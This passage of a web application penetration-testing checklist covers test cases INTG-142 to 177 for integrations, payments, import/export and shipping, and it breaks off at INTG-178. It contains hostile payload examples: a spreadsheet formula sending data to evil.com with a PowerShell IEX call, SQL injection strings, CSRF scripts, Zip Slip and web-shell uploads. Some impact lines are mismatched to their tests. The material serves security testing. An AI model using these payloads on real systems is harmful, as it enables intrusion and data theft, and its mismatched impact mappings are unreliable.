**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Configure a third-party integration. 2. Add hidden parameters like is_admin=true or bypass_validation=true. 3. Check if unauthorized configuration fields are accepted.

**Expected Result:** Application must whitelist allowed integration configuration parameters and ignore any unauthorized fields.

**Payload Example:**

```
Add is_admin=true&full_access=true&rate_limit=0&bypass_auth=true to integration config request body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## INTG-143 — Third-party Integration Dependency Confusion
**Test Category:** Supply Chain (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify third-party packages used in integrations. 2. Check for private package names that could be squatted on public registries. 3. Test for dependency confusion vulnerabilities.

**Expected Result:** Application must use scoped package names and configure package managers to prioritize private registries over public ones.

**Payload Example:**

```
Check for internal package names on npm/PyPI;create public package with same name as internal dependency
```

**Impact:** Supply-chain / dependency confusion -&gt; build &amp; CI compromise -&gt; RCE.

**Tools:** npm audit;pip audit;Manual Review

**References:** CWE-829; -&gt;[Dependency Confusion checklist](#/checklist/depconfusion); Alex Birsan Dependency Confusion

---

## INTG-144 — Export Timing Attack for User Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Request data exports for different user accounts. 2. Measure response times. 3. Check if timing differences reveal whether accounts exist or have data.

**Expected Result:** Application must ensure consistent response times for export requests regardless of account existence or data volume.

**Payload Example:**

```
Compare response times for GET /api/export?user=existing vs user=nonexistent across 100+ requests
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## INTG-145 — Import File Content-Type Bypass
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Upload an import file with a manipulated Content-Type header. 2. Send executable content with Content-Type: text/csv. 3. Check if content type validation relies on headers vs actual content.

**Expected Result:** Application must validate import file content by inspecting file contents not relying on Content-Type headers.

**Payload Example:**

```
Upload PHP web shell with Content-Type: text/csv and .csv extension but PHP content
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## INTG-146 — Export Data Injection for Report Manipulation
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Insert data designed to manipulate export reports. 2. Include formulas or special characters in data fields. 3. Export and check if exported data can execute code in spreadsheet applications.

**Expected Result:** Application must escape formula-triggering characters in export data to prevent CSV injection attacks.

**Payload Example:**

```
Insert =IMPORTXML("https://evil.com/steal?"&A1;A1) or =cmd|'/C powershell IEX...'!A0 in data fields before export
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-147 — Sync API Version Mismatch Exploitation
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Check API version used for external sync. 2. Try sending sync requests with older API versions. 3. Check if older versions lack security controls. 4. Test for version downgrade attacks.

**Expected Result:** Application must enforce minimum API versions for sync operations and maintain consistent security controls across all versions.

**Payload Example:**

```
Send sync requests to /api/v1/sync (potentially less secure) instead of /api/v3/sync
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-148 — Sync Webhook Secret Rotation Failure
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Check if sync webhook secrets can be rotated. 2. Rotate the secret. 3. Test if old secret still validates webhooks. 4. Verify immediate invalidation of old secrets.

**Expected Result:** Application must immediately invalidate old webhook secrets upon rotation and reject webhooks signed with old secrets.

**Payload Example:**

```
Rotate webhook secret then send webhook signed with old_secret;check if both old and new secrets are accepted
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-149 — Zapier Test Mode Data Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. If Zapier integration has a test mode check what data is exposed during testing. 2. Verify if production data is used in test samples. 3. Check for sensitive data in test responses.

**Expected Result:** Application must use synthetic test data for Zapier integration testing and never expose production data in test mode.

**Payload Example:**

```
Check Zapier test polling for real customer data;verify test samples contain anonymized data only
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-150 — IFTTT Action Rate Limit Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Configure IFTTT action to create resources in the application. 2. Trigger the action rapidly via IFTTT. 3. Check if application rate limits IFTTT-originated actions.

**Expected Result:** Application must implement rate limiting on all actions triggered through automation platforms regardless of the authentication method.

**Payload Example:**

```
Trigger 100+ IFTTT actions per minute;check if automation-originated requests bypass normal rate limits
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## INTG-151 — CRM Integration Field Mapping Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Configure field mapping between application and CRM. 2. Modify field mappings to map sensitive fields to unexpected CRM fields. 3. Check if sensitive data lands in unprotected CRM fields.

**Expected Result:** Application must validate field mappings and prevent mapping of sensitive application fields to unprotected CRM fields.

**Payload Example:**

```
Map password_hash to crm_notes field;map credit_card to crm_custom_field;map internal_id to public CRM field
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-152 — CRM Contact Deduplication Exploitation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Create duplicate contacts via CRM sync. 2. Check deduplication logic for bypass opportunities. 3. Test if deduplication can be exploited to merge different users' data.

**Expected Result:** Application must implement robust deduplication that preserves data integrity and does not merge unrelated user records.

**Payload Example:**

```
Create contacts with similar names/emails to trigger false deduplication merging different users' CRM records
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-153 — ERP Integration Privilege Escalation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Access ERP integration with regular user credentials. 2. Check if ERP integration grants elevated privileges. 3. Test if ERP sync endpoint allows admin-level data access.

**Expected Result:** Application must enforce least privilege on ERP integration endpoints and not grant broader access than the user's application role.

**Payload Example:**

```
Access GET /api/erp/inventory (admin-level data) through ERP integration with regular user token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-154 — ERP Integration Data Integrity Verification
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Intercept ERP sync data. 2. Modify inventory counts or pricing data in transit. 3. Check if modified data is accepted without integrity checks. 4. Verify checksums or signatures.

**Expected Result:** Application must implement data integrity verification through checksums or digital signatures on all ERP sync data.

**Payload Example:**

```
Modify inventory_count=100 to inventory_count=0 in ERP sync payload;change price=10.00 to price=0.01
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** mitmproxy;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## INTG-155 — Social Media Token Refresh IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Refresh social media token for own integration. 2. Change integration_id to another user's social connection. 3. Check if another user's token is refreshed and exposed.

**Expected Result:** Application must verify ownership before refreshing social media tokens and never expose refreshed tokens in responses.

**Payload Example:**

```
POST /api/social/refresh-token with integration_id=INT-2001 belonging to User B using User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-156 — Social Media Disconnect CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Craft a malicious page that disconnects the victim's social media integration. 2. Lure victim to visit. 3. Check if social account is disconnected without CSRF token validation.

**Expected Result:** Application must validate CSRF tokens on all social media account management operations.

**Payload Example:**

```
<script>fetch('/api/social/disconnect/facebook',{method:'DELETE',credentials:'include'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## INTG-157 — Email Service Bounce Processing Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. If the application processes email bounce notifications check for injection. 2. Spoof bounce notifications with malicious payloads. 3. Check if bounce processing is vulnerable to injection.

**Expected Result:** Application must validate and sanitize all data from email bounce processing and verify bounce notification authenticity.

**Payload Example:**

```
Send spoofed bounce notification with recipient=test@test.com' OR 1=1--;check for SQL injection in bounce handler
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-158 — Email Service Template IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Access own email templates through the integration. 2. Change template_id to access templates from other accounts. 3. Check if other organizations' email templates are accessible.

**Expected Result:** Application must verify ownership before displaying or modifying email templates managed through the integration.

**Payload Example:**

```
GET /api/email/templates/TMPL-2001;PUT /api/email/templates/TMPL-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-159 — Analytics Event Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Identify analytics events tracked by the application. 2. Send fake analytics events via client-side manipulation. 3. Check if spoofed events affect business decisions or trigger actions.

**Expected Result:** Application must validate analytics events server-side before using them for business logic or triggering automated actions.

**Payload Example:**

```
Send fake analytics.track('high_value_purchase') events;spoof conversion events;inject false metrics
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## INTG-160 — Analytics Integration Data Exfiltration
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Monitor all data sent to analytics services. 2. Check if PII or sensitive data is included in analytics events. 3. Verify data anonymization practices.

**Expected Result:** Application must anonymize user data in analytics events and not send PII to third-party analytics services without proper consent and safeguards.

**Payload Example:**

```
Monitor analytics requests for email;phone;address;financial_data in event properties
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite;Wireshark

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-161 — Payment Gateway Webhook Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Send multiple simultaneous payment success webhooks for the same transaction. 2. Check if multiple orders are fulfilled. 3. Verify idempotent webhook processing.

**Expected Result:** Application must process payment webhooks idempotently and prevent duplicate order fulfillment from concurrent webhook deliveries.

**Payload Example:**

```
Send 20 concurrent payment_success webhooks with same transaction_id
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## INTG-162 — Payment Gateway Downgrade Attack
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Check if the application supports multiple payment gateway versions. 2. Force use of older less secure versions. 3. Test for protocol downgrade vulnerabilities.

**Expected Result:** Application must enforce minimum secure versions of payment gateway protocols and reject downgrade attempts.

**Payload Example:**

```
Modify gateway_version parameter to older version;force TLS 1.0 on payment connections;use deprecated API endpoints
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;SSLscan

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-163 — Payment Gateway Error Message Information Disclosure
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Trigger payment errors with invalid data. 2. Check error responses for gateway credentials or internal configuration. 3. Send malformed payment requests.

**Expected Result:** Application must return generic payment error messages without exposing gateway credentials or internal configuration details.

**Payload Example:**

```
Submit malformed payment data and check errors for merchant_id;api_key;gateway_config;internal_endpoint
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-164 — Shipping Provider Account Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Test shipping provider integration with various account numbers. 2. Check if responses differ for valid vs invalid accounts. 3. Enumerate shipping accounts.

**Expected Result:** Application must not reveal shipping account validity through response differences and must use server-side account management.

**Payload Example:**

```
Enumerate shipping_account_number with variations;compare responses for valid vs invalid accounts
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## INTG-165 — Shipping Tracking Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. If the application fetches tracking data from shipping providers inject payloads in tracking number lookups. 2. Check for injection through the shipping provider API proxy.

**Expected Result:** Application must validate and sanitize tracking numbers before sending to shipping provider APIs.

**Payload Example:**

```
tracking_number=TRACK-001' OR 1=1--;tracking=<script>alert(1)</script>;track_id=${7*7}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-166 — Shipping Provider Integration CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Craft a malicious page that modifies the victim's shipping provider configuration. 2. Lure victim to visit. 3. Check if shipping settings are changed without CSRF protection.

**Expected Result:** Application must validate CSRF tokens on all shipping provider configuration changes.

**Payload Example:**

```
<form action='https://target.com/api/shipping/config' method='POST'><input name='provider' value='attacker_provider'><input name='api_key' value='attacker_key'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## INTG-167 — API Key Cross-Tenant Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. In a multi-tenant application use API key from Tenant A to access Tenant B's resources. 2. Check if tenant isolation is enforced on API key authentication.

**Expected Result:** Application must enforce strict tenant isolation and verify that API keys can only access resources within their own tenant.

**Payload Example:**

```
Use Tenant A's API key in requests to /api/tenants/B/resources;check for cross-tenant data access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-168 — Webhook Mutual TLS Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. If webhook delivery uses mutual TLS check if mTLS is enforced. 2. Connect without client certificate. 3. Present invalid certificate. 4. Check if webhook delivery continues without proper mTLS.

**Expected Result:** Application must enforce mutual TLS on webhook deliveries when configured and reject connections without valid client certificates.

**Payload Example:**

```
Connect to webhook endpoint without client cert;present self-signed or invalid cert;check for mTLS bypass
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** cURL;OpenSSL;Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-169 — OAuth Dynamic Client Registration Abuse
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Check if dynamic client registration is enabled. 2. Register a new OAuth client without proper authorization. 3. Set privileged redirect URIs and scopes. 4. Check for registration rate limiting.

**Expected Result:** Application must restrict dynamic client registration to authorized users and validate all registration parameters.

**Payload Example:**

```
POST /oauth/register with {"redirect_uris":["https://evil.com"];"scope":"admin";"grant_types":["authorization_code"]} without auth
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-170 — Third-party Integration Privilege Persistence
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Grant a third-party integration access. 2. Reduce user's own permissions. 3. Check if the integration retains the original higher permissions. 4. Verify permission synchronization.

**Expected Result:** Application must synchronize integration permissions with the user's current access level and not allow privilege persistence.

**Payload Example:**

```
Downgrade user from admin to regular;check if third-party integration still has admin-level access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-171 — Import Zip Slip Vulnerability
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. If import accepts ZIP archives create a ZIP with path traversal in filenames. 2. Upload the malicious ZIP. 3. Check if files are extracted outside intended directory.

**Expected Result:** Application must validate filenames within archives and prevent path traversal during archive extraction.

**Payload Example:**

```
Create ZIP with file named ../../../../../../var/www/html/shell.php inside the archive
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Custom Scripts;evilarc

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## INTG-172 — Sync OAuth Scope Persistence After Revocation
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Grant sync integration broad OAuth scopes. 2. Revoke some scopes through the management interface. 3. Check if the sync still operates with revoked scopes. 4. Verify scope enforcement.

**Expected Result:** Application must immediately enforce scope changes on active sync connections and reject operations requiring revoked scopes.

**Payload Example:**

```
Revoke write scope then trigger sync that requires write access;check if write operations still succeed
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-173 — CRM Integration Bulk Data Export Without Rate Limiting
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Use CRM integration to export customer data. 2. Send rapid bulk export requests. 3. Check for rate limiting. 4. Verify if the entire customer database can be extracted.

**Expected Result:** Application must implement rate limiting on CRM data export operations and enforce data export quotas.

**Payload Example:**

```
Send 100+ GET /api/crm/export requests;request page_size=999999;check for export throttling
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## INTG-174 — ERP Integration Audit Log Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Perform ERP operations through the integration. 2. Check if operations are logged in the audit trail. 3. Test if integration-originated operations bypass audit logging.

**Expected Result:** Application must log all ERP integration operations in the audit trail with proper attribution to the initiating user.

**Payload Example:**

```
Perform inventory changes via ERP integration and check if audit_log captures source=erp_integration;user=initiating_user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Manual Review

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-175 — Payment Gateway 3DS Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. If 3D Secure is required intercept the payment flow. 2. Skip the 3DS verification step. 3. Modify the 3DS status parameter. 4. Check if payment processes without proper 3DS authentication.

**Expected Result:** Application must enforce 3DS verification server-side and verify 3DS status with the payment gateway before completing transactions.

**Payload Example:**

```
Skip 3DS redirect;change threeds_status=authenticated without actual 3DS;modify eci_indicator to bypass
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-176 — Payment Idempotency Key Reuse Attack
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Make a payment with an idempotency key. 2. Modify the payment amount. 3. Reuse the same idempotency key with the modified amount. 4. Check if the new amount is charged or the original returned.

**Expected Result:** Application must properly implement idempotency by rejecting modified requests with reused keys and returning the original response.

**Payload Example:**

```
Reuse Idempotency-Key: key123 with modified amount from 100 to 1;check which amount is processed
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-177 — Multi-Carrier Rate Shopping Abuse
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Request rates from multiple carriers. 2. Intercept and mix carrier IDs with rate IDs from different carriers. 3. Check if a premium carrier service can be booked at a basic carrier's rate.

**Expected Result:** Application must validate that the selected rate belongs to the selected carrier and was generated for the current shipment.

**Payload Example:**

```
Select FedEx carrier_id but use UPS rate_id for cheaper ground rate;mix service_id across carriers
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-178 — Shipping Manifest Injection
